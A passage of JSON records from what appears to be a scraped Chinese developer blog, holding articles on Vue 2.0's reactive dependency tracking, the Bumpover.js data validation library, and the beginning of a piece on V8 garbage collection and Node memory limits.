}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接着看订阅事件(也就是上面的Dep.target)具体指的是啥。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    constructor(options) {\n        this.\u003cspan class=\"hljs-variable\"\u003e$options\u003c/span\u003e = options\n        this._data = options.data\n        Object.keys(options.data).forEach(key =\u0026gt; this._proxy(key))\n        observer(options.data)\n        watch(this, this._render.bind(this), this._update.bind(this))\n    }\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003e_render\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e VNode = this.\u003cspan class=\"hljs-variable\"\u003e$options\u003c/span\u003e.render.call(this)\n        document.getElementById(this.\u003cspan class=\"hljs-variable\"\u003e$options\u003c/span\u003e.el).innerHTML = JSON.stringify(VNode)\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e VNode\n    }\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003e_update\u003c/span\u003e\u003c/span\u003e() {\n        console.log(\u003cspan class=\"hljs-string\"\u003e\"我将要更新\"\u003c/span\u003e);\n        const vdom = this._render.call(this)\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e watch(vm, exp, cb) {\n        // exp==\u0026gt;_render\n        // cb==\u0026gt;update\n        // 先执行一下render,并且让update方法watch this对象\n        // 这一步比较巧妙，先把update这个cb放到target对象上。执行_render时，如果使用到了data上的对象，那么update就会被添加到dep里，也就实现了update watch data.\n        Dep.target = cb\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e vdom = exp()\n        Dep.target = null\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e vdom\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e。。其实想想也就知道了，当然是数据改变，页面要重新渲染了。watch方法里有个很牛叉的地方：首先Dep.target = cb，将_update这个订阅事件赋给了Dep.target，然后执行了exp也就是_render方法，到最后执行的就是我们new Vue实例时传入的render方法，\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.__h__(\u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e, {}, [\n            this.__h__(\u003cspan class=\"hljs-string\"\u003e'span'\u003c/span\u003e, {}, [this.__toString__(this.text)]),\n            this.__h__(\u003cspan class=\"hljs-string\"\u003e'span'\u003c/span\u003e, {}, [this.__toString__(this.text2)])\n        ])\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看，这个方法里调用了this.text和this.text2哎，于是text和text2的get回调被触发。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    get: () =\u0026gt; {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Dep.target) {\n            dep.add(Dep.target)\n        }\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e val\n    },\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由于Dep.target在上一刻神奇的被赋值(_update方法)了，所以_update被收进了text和text2的dep实例里，当render执行完后，Dep.target = null又被神奇的置为了空。\u003c/p\u003e\n\u003cp\u003e就这样当执行到demo.text = \"after change text\"时，_update方法被执行了，页面被重新渲染了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e小缺陷：_update方法被多次重复执行\u003c/h2\u003e\n\u003cp\u003e当我们在一次setTimeout()里既改变text，又改变text2时，由于_update既被添加到了text的dep实例中，又被添加到了text2的dep实例中，所以_render会被执行两次。第一次_render后text被改变成新的了，document.getElementById(this.\u003cimg alt=\"options.el).innerHTML = ...执行，页面刷新；第二次_render后text2被改变成新的了，document.getElementById(this.\" class=\"equation\" src=\"https://juejin.im/equation?tex=options.el).innerHTML%20%3D%20...%E6%89%A7%E8%A1%8C%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%88%B7%E6%96%B0%EF%BC%9B%E7%AC%AC%E4%BA%8C%E6%AC%A1_render%E5%90%8Etext2%E8%A2%AB%E6%94%B9%E5%8F%98%E6%88%90%E6%96%B0%E7%9A%84%E4%BA%86%EF%BC%8Cdocument.getElementById(this.\"\u003eoptions.el).innerHTML = ...执行，页面又刷新；这看起来是期望得到了。但是由于js是同步执行的，这两次页面的改变的间隔几乎可以忽略不计，人眼肯定是无法差觉得。当页面复杂时，页面会由于回流或重绘造成性能问题。\u003c/p\u003e\n\u003cp\u003e此处解决的方法是使用Promise，在同步任务执行完后执行Microtask时更新页面：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    constructor(options) {\n        this.queueNextTick = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n    }\n    \n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003e_update\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!this.queueNextTick) {\n            this.queueNextTick = new Promise((resolve)=\u0026gt;{\n                resolve()\n            })\n            this.queueNextTick.then(()=\u0026gt;{\n                console.log(\u003cspan class=\"hljs-string\"\u003e\"我将要更新\"\u003c/span\u003e);\n                const vdom = this._render.call(this)\n                console.log(vdom);\n                this.queueNextTick = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n            })\n        }\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/mcdyzg/vue-analyse.git\"\u003e代码\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e参考(嗯90%)：\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode\u003e[理解vue2.0的响应式架构.md](https://segmentfault.com/a/1190000007334535)\u003c/code\u003e\u003c/pre\u003e\n","buildTime":"1515150742.3217","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be98fb"},"id":"5a4eaf63f265da3e2744f649","author":{"$oid":"5a4b765a751bf823c002e91e"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Bumpover.js - 牢固而趁手的数据校验转换库","meta":{"likeCount":0},"tag":["JSON","JavaScript"],"comment":[],"shortContent":"Bumpover 能帮助你编写出简洁明了的数据校验与转换代码。通过熟悉的类型注解 API 与声明式的转换规则，你可以轻松地在运行期校验未知的数据，并将其转换为自己可控的格式。 稳定的数据结构对应用至关重要，但在持续的需求变更和版本迭代中，数据格式总是处于频繁的变动之中。你当然可…","content":"\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/doodlewind/bumpover\"\u003eBumpover\u003c/a\u003e 能帮助你编写出简洁明了的数据校验与转换代码。通过熟悉的\u003cstrong\u003e类型注解 API\u003c/strong\u003e 与\u003cstrong\u003e声明式的转换规则\u003c/strong\u003e，你可以轻松地在\u003cstrong\u003e运行期\u003c/strong\u003e校验未知的数据，并将其转换为自己可控的格式。\u003c/p\u003e\n\u003cp\u003e稳定的数据结构对应用至关重要，但在持续的需求变更和版本迭代中，数据格式\u003cstrong\u003e总是\u003c/strong\u003e处于频繁的变动之中。你当然可以编写更多的 if else 逻辑来兼容不同类型的数据，不过这显然会带来更多枯燥、随意而危险的面条代码。有没有更好的方式呢？\u003c/p\u003e\n\u003cp\u003e现在，TypeScript 和 Flow 已经为我们带来了非常方便的类型声明 API，可以帮助你在\u003cstrong\u003e编译期\u003c/strong\u003e检测出潜在的类型问题。不过对于\u003cstrong\u003e运行期\u003c/strong\u003e未知的数据 - 如源自后端接口、文件系统和剪贴板粘贴的数据 - 它们的作用也相对有限：想想上次对接后端接口的时候你调了多久？\u003c/p\u003e\n\u003cp\u003e并且，在一般意义上的数据校验之外，数据的转换与迁移也是日常开发中非常常见的场景。除了数据可视化这样需要频繁转换数据结构的场景外，对于一些将复杂 JSON 或 XML 内容序列化为字符串后存储在关系型数据库中的数据，它们在数据结构变动时，清洗起来是相当困难的：完成一道把 \u003ccode\u003e'\u0026lt;p\u0026gt;123\u0026lt;/p\u0026gt;'\u003c/code\u003e 解析成 \u003ccode\u003e{ paragraph: 123 }\u003c/code\u003e 的面试题是一回事，保证稳定可预期的数据转换就是另一回事了。\u003c/p\u003e\n\u003cp\u003eBumpover 就是设计来解决上面这几个问题的。它通过结合来自 \u003ca target=\"_blank\" href=\"https://github.com/ianstormtaylor/superstruct\"\u003eSuperstruct\u003c/a\u003e 的类型声明和规则驱动的数据更新机制，实现了：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e对 JSON 与 XML 格式数据声明式的校验 - 类似 JSON Schema，但轻便灵活得多。\u003c/li\u003e\n\u003cli\u003e友好的类型注解 API，支持递归定义的数据类型。\u003c/li\u003e\n\u003cli\u003e基于 Promise 的数据节点更新规则，可异步转换存在外部依赖的数据。\u003c/li\u003e\n\u003cli\u003e灵活的数据遍历机制，允许全量保留子节点、过滤未知节点等。\u003c/li\u003e\n\u003cli\u003e可插拔的序列化和反序列化器，可轻松地支持各类私有数据格式。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e说了这么多，那么 Bumpover 到底如何使用呢？耽误你一分钟的时间就够了：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e开始前，记得安装依赖 :-)\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm install --save bumpover superstruct\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e将 Bumpover 与 Superstruct 导入到代码库中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { Bumpover } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'bumpover'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { struct } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'superstruct'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e假设这个场景：你有一份数据，其内容可能是虚拟 DOM 树中的节点，格式长这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e maybeNode = {\n  \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003eprops\u003c/span\u003e: { \u003cspan class=\"hljs-attr\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'red'\u003c/span\u003e },\n  \u003cspan class=\"hljs-attr\"\u003echildren\u003c/span\u003e: []\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们可以定义一个 struct 来校验它：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { struct } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'superstruct'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e Node = struct({\n  \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'string'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003eprops\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'object?'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003echildren\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'array'\u003c/span\u003e\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在我们就能用 \u003ccode\u003eNode\u003c/code\u003e 来校验数据啦，将其作为函数调用即可：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eNode(maybeNode)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e一旦数据校验失败，你会获得详细的错误信息，而成功时会返回校验后的数据。\u003c/p\u003e\n\u003cp\u003e现在如果我们需要转换这份数据，该怎么做呢？比如，如果我们需要把所有的 \u003ccode\u003ediv\u003c/code\u003e 标签换成 \u003ccode\u003espan\u003c/code\u003e 标签，并保留其它节点，该怎样可靠地实现呢？你可以过程式地人肉遍历数据，或者，简单地定义\u003cstrong\u003e规则\u003c/strong\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { Bumpover } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'bumpover'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e rules = [\n  {\n    \u003cspan class=\"hljs-attr\"\u003ematch\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003enode\u003c/span\u003e =\u0026gt;\u003c/span\u003e node.name === \u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003eupdate\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003enode\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eresolve, reject\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n      resolve({\n        \u003cspan class=\"hljs-attr\"\u003enode\u003c/span\u003e: { ...node, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'span'\u003c/span\u003e }\n      })\n    })\n  }\n]\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e bumper = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Bumpover(rules)\nbumper.bump(data).then(\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log)\n\n\u003cspan class=\"hljs-comment\"\u003e// 获得新节点数据\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e只要提供规则，bumpover 就会帮助你处理好剩下的脏活。注意下面几点就够了：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRules 规则是实现转换逻辑的 Single Source of Truth。\u003c/li\u003e\n\u003cli\u003e使用 \u003ccode\u003erule.match\u003c/code\u003e 匹配节点。\u003c/li\u003e\n\u003cli\u003e使用 \u003ccode\u003erule.update\u003c/code\u003e 在 Promise 内更新节点，这带来了对异步更新的支持：对一份富文本 XML 数据，在做数据迁移时可能需要将其中 \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e 标签里的图片链接重新上传到云端，成功后再将新的链接写入新的数据结构中。Bumpover 能很好地支持这样的异步更新。\u003c/li\u003e\n\u003cli\u003e将新节点包装在 \u003ccode\u003enode\u003c/code\u003e 字段内 resolve 即可。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这就是最基础的示例了！对于更新后获得的数据，你还可以为每条规则提供 \u003ccode\u003erule.struct\u003c/code\u003e 字段，校验转换得到的新节点是否符合你的预期。\u003c/p\u003e\n\u003cp\u003e转换简单的 JS 对象数据还不能完全体现出 Bumpover 的强大之处。考虑另一个场景：前端对 XML 格式数据的处理，一直缺乏易用的 API。除了原生 DOM 诡异的接口外，sax 这样基于流的处理方式也十分沉重。而 Bumpover 则提供了开箱即用的 \u003ccode\u003eXMLBumpover\u003c/code\u003e 可以帮助你。同样是把 \u003ccode\u003e\u0026lt;div\u0026gt;\u003c/code\u003e 转换为 \u003ccode\u003e\u0026lt;span\u0026gt;\u003c/code\u003e 标签，对 JSON 和 XML 格式数据的转换规则\u003cstrong\u003e完全一致\u003c/strong\u003e！\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eXML 转换需要安装 \u003ccode\u003exml-js\u003c/code\u003e 依赖\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { XMLBumpover } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'bumpover'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e rules = [\n  {\n    \u003cspan class=\"hljs-attr\"\u003ematch\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003enode\u003c/span\u003e =\u0026gt;\u003c/span\u003e node.name === \u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003eupdate\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003enode\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eresolve, reject\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n      resolve({\n        \u003cspan class=\"hljs-attr\"\u003enode\u003c/span\u003e: { ...node, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'span'\u003c/span\u003e }\n      })\n    })\n  }\n]\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e input = \u003cspan class=\"hljs-string\"\u003e`\n\u0026lt;div\u0026gt;\n  \u0026lt;div\u0026gt;demo\u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n`\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e bumper = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e XMLBumpover(rules)\nbumper.bump(input).then(\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log)\n\n\u003cspan class=\"hljs-comment\"\u003e// '\u0026lt;span\u0026gt;\u0026lt;span\u0026gt;demo\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这背后有什么黑魔法呢？不存在的。对于你自己的各种神奇的数据格式，\u003cstrong\u003e只要你能提供它与 JSON 互相转换的 Parser，你就能编写同样的 Bumpover 规则来校验并转换它\u003c/strong\u003e。作为例子，Bumpover 还提供了一个 \u003ccode\u003eJSONBumpover\u003c/code\u003e 类，能够处理 JSON 字符串。我们来看看它的实现源码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { Bumpover } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./index'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eJSONBumpover\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eBumpover\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e (rules, options) {\n    \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e(rules, options)\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.options = {\n      ...this.options,\n      \u003cspan class=\"hljs-attr\"\u003eserializer\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.stringify,\n      \u003cspan class=\"hljs-attr\"\u003edeserializer\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.parse\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e只要提供了 \u003ccode\u003eJSON.parse\u003c/code\u003e 和 \u003ccode\u003eJSON.stringify\u003c/code\u003e，你就能支持一种全新的数据类型了。并且，你还可以把 \u003ccode\u003exml2js\u003c/code\u003e 和 \u003ccode\u003eJSON.stringify\u003c/code\u003e 相结合，定制出更灵活的数据转换器 😉\u003c/p\u003e\n\u003cp\u003e如果这些实例让你有了点兴趣，Bumpover 项目下还有一份完整的 \u003ca target=\"_blank\" href=\"https://github.com/doodlewind/bumpover/blob/master/docs/walkthrough.md\"\u003eWalkthrough\u003c/a\u003e，介绍如何使用 Bumpover 实现异步迁移、及早返回、过滤节点等更灵活的特性，辅以完整的 \u003ca target=\"_blank\" href=\"https://github.com/doodlewind/bumpover/blob/master/docs/reference.md\"\u003eAPI 文档\u003c/a\u003e。并且，Bumpover 虽然才开始开发不到一周，但已经实现了测试用例的 \u003cstrong\u003e100% 代码覆盖率\u003c/strong\u003e，欢迎感兴趣的同学前来体验哦 😀\u003c/p\u003e\n\u003cp\u003e最后作为一点花絮，介绍一下笔者开发 Bumpover 的动机，以及它和 Superstruct 的渊源：Superstruct 与 \u003ca target=\"_blank\" href=\"https://github.com/ianstormtaylor/slate\"\u003eSlate\u003c/a\u003e 富文本编辑框架师出同门，而笔者本人恰好是这个编辑器的主要贡献者之一。Slate 在 \u003ccode\u003ev0.30\u003c/code\u003e 左右遇到了编辑器 Schema 校验的各种问题，而 Superstruct 就是一个应运而生，允许自定义更灵活 Schema 的新轮子。而笔者在实际使用中发现 Superstruct 还能够推广到更一般的场景下，这就是 Bumpover 诞生的源动力了。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/doodlewind/bumpover\"\u003eBumpover\u003c/a\u003e 还处于非常早期的阶段，非常希望各位 dalao 们能够赏脸支持~谢谢！\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/doodlewind/bumpover\"\u003eBumpover Repo\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/ianstormtaylor/superstruct\"\u003eSuperstruct Repo\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://juejin.im/post/59e6fc9951882578d503952c\"\u003eSlate 介绍\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","buildTime":"1515151031.7105","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be98fc"},"id":"5a4f1281f265da3e484ba02f","author":{"$oid":"5a4f5f6218646e1ee8be98e4"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Node垃圾回收与内存限制","meta":{"likeCount":0},"tag":["V8","Node.js","JavaScript","算法"],"comment":[],"shortContent":"泄漏产生的原因其实也很简单：event.js 核心模块实现的事件发布/订阅本质上是一个js对象结构（在v6版本中为了性能采用了new EventHandles()，并且把EventHandles的原型置为null来节省原型链查找的消耗），因此我们每一次调用 event.on 或…","content":"\u003ch2\u003e对象分配\u003c/h2\u003e\u003cblockquote\u003e\u003cp\u003e所有的JS对象都是通过堆来进行分配的。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e使用process.memoryUsage()查看使用情况 \u003ca href=\"https://nodejs.org/dist/latest-v6.x/docs/api/process.html#process_process_memoryusage\"\u003eNode.js v6.11.3文档\u003c/a\u003e\u003cbr\u003eheapTotal and heapUsed refer to V8's memory usage. external refers to the memory usage of C++ objects bound to JavaScript objects managed by V8.\u003c/p\u003e\u003c/blockquote\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u0026gt; process.\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ememoryUsage\u003c/span\u003e\u003c/span\u003e()\n{ rss: 27541504, \n  heapTotal: 9437184, \n  heapUsed: 5897048,\n  external: 8935 }\n  // 单位 字节\n  // rss (resident \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e size) 常驻进程内存 所有内存占用\n  // heapTotal 已申请堆内存\n  // heapUsed 已使用堆内存\n  // external c++对象绑定到js的内存\n\u003c/code\u003e\u003c/pre\u003e\u003ch3\u003e内存限制\u003c/h3\u003e\u003cblockquote\u003e\u003cp\u003e内存限制主要原因是v8的垃圾回收制度。1.5GB内存做一次小的回收需要50MS，做一次非增量性回收需要1S以上，并且这会使JS线程暂停。因此限制内存。\u003c/p\u003e\u003c/blockquote\u003e\u003cp\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4e045bd03a8b?w=533\u0026amp;h=680\u0026amp;f=png\u0026amp;s=32213\"\u003e\u003c/p\u003e\u003ch5\u003eV8的堆组成\u003c/h5\u003e\u003cp\u003eV8的堆由一系列区域组成：\u003c/p\u003e\u003cblockquote\u003e\u003cp\u003e新生代区：大多数对象的创建被分配在这里，这个区域很小，但垃圾回收非常频繁，独立于其它区。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e老生代指针区：包含大部分可能含有指向其它对象指针的对象。大多数从新生代晋升（存活一段时间）的对象会被移动到这里。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e老生代数据区：包含原始数据对象（没有指针指向其它对象）。Strings、boxed numbers以及双精度unboxed数组从新生代中晋升后被移到这里。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e大对象区：这里存放大小超过其它区的大对象。每个对象都有自己mmap内存。大对象不会被回收。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e代码区：代码对象（即包含被JIT处理后的指令对象）存放在此。唯一的有执行权限的区域（代码过大也可能存放在大对象区，此时它们也可被执行，但不代表大对象区都有执行权限）。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003eCell区、属性Cell区以及map区：包含cell、属性cell以及map。每个区都存放他们指向的相同大小以及相同结构的对象。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003ev8在64位系统下只能使用1.4GB内存，在32位系统下只能使用0.7GB内存。\u003c/p\u003e\u003c/blockquote\u003e\u003ch5\u003e如何解除内存限制？\u003c/h5\u003e\u003cblockquote\u003e\u003cp\u003e利用堆外内存: 使用Buffer类。Buffer 性能相关部分由C++实现。\u003ca href=\"http://www.runoob.com/nodejs/nodejs-buffer.html\"\u003eBuffer教程\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e在启动node时，传递--max-old-space-size=4096 (调整老生代内存限制，单位为mb。--max-new-space-size 已经不可用了)\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e使用stream处理大文件 \u003ca href=\"http://www.runoob.com/nodejs/nodejs-stream.html\"\u003estream教程\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e官方建议：it is recommended that you split your single process into several workers if you are hitting memory limits. （拆分进程）\u003c/p\u003e\u003c/blockquote\u003e\u003ch2\u003e垃圾回收机制\u003c/h2\u003e\u003cp\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4e04683eaf96?w=2086\u0026amp;h=1288\u0026amp;f=png\u0026amp;s=169336\"\u003e\u003c/p\u003e\u003ch5\u003eV8的垃圾回收有如下几个特点\u003c/h5\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e当处理一个垃圾回收周期时，暂停所有程序的执行。(stop-the-world 全停顿)  \n\n在大多数垃圾回收周期，每次仅处理部分堆中的对象，使暂停程序所带来的影响降至最低。(增量标记等算法) \n\n准确知道在内存中所有的对象及指针，避免错误地把对象当成指针所带来的内存泄露。(标记指针法:在每个指针的末位预留一位来标记这个字代表的是指针或数据。)\n\n在V8中，对象堆被分为两个部分：新创建的对象所在的新生代，以及在一个垃圾回收周期后存活的对象被提升到的老生代。\n如果一个对象在一个垃圾回收周期中被移动，那么V8将会更新所有指向此对象的指针。\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\u003cp\u003e没有一种算法能够胜任所有场景，因此现代垃圾回收算法中按对象的存活时间将内存的垃圾回收进行不同的分代，然后分别对不同分代实行不同算法\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003ev8将内存分为新生代和老生代\u003c/p\u003e\u003c/blockquote\u003e\u003ch5\u003e主要算法\u003c/h5\u003e\u003col\u003e\u003cli\u003e\u003cp\u003eScavenge算法 